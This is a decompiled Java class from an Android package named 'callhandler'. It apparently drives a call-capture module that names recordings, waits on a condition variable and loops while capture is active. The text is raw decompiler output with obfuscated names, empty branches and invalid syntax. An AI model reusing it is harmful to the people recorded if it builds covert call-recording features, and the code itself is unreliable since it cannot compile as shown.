package com.vvt.callhandler;

import android.os.ConditionVariable;
import android.os.SystemClock;

class h
  implements Runnable
{
  h(c paramc, String paramString) {}
  
  public void run()
  {
    try
    {
      Object localObject1 = b.a();
      do
      {
        bool1 = c.e();
        if (bool1) {}
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject2 = ((StringBuilder)localObject2).append((String)localObject1);
        Object localObject3 = "_#";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject3 = this.b;
        int i = c.k((c)localObject3);
        localObject2 = ((StringBuilder)localObject2).append(i);
        localObject2 = ((StringBuilder)localObject2).toString();
        boolean bool2 = c.e();
        if (bool2) {}
        localObject3 = this.b;
        long l1 = 1800L;
        c.a((c)localObject3, l1);
        localObject3 = this.b;
        localObject3 = c.g((c)localObject3);
        String str2 = this.a;
        ((com.vvt.capture.a.a)localObject3).a(str2, (String)localObject2);
        localObject2 = this.b;
        long l2 = SystemClock.elapsedRealtime();
        c.b((c)localObject2, l2);
        bool1 = c.e();
        if (bool1) {}
        localObject2 = this.b;
        localObject2 = c.h((c)localObject2);
        if (localObject2 != null)
        {
          bool1 = c.e();
          if (bool1) {}
          localObject2 = this.b;
          localObject2 = c.h((c)localObject2);
          ((ConditionVariable)localObject2).close();
          localObject2 = this.b;
          localObject2 = c.h((c)localObject2);
          ((ConditionVariable)localObject2).block();
        }
        localObject2 = this.b;
        localObject2 = c.g((c)localObject2);
        bool1 = ((com.vvt.capture.a.a)localObject2).e();
      } while (bool1);
      boolean bool3 = c.e();
      if (bool3) {}
      localObject1 = this.b;
      c.l((c)localObject1);
      localObject1 = this.b;
      bool1 = false;
      localObject2 = null;
      c.a((c)localObject1, null);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1 = c.f();
        if (bool1) {}
        c.l(this.b);
        c.a(this.b, null);
        Object localObject2 = c.f(this.b);
        String str1 = localException.toString();
        b.a((com.vvt.base.a)localObject2, str1);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */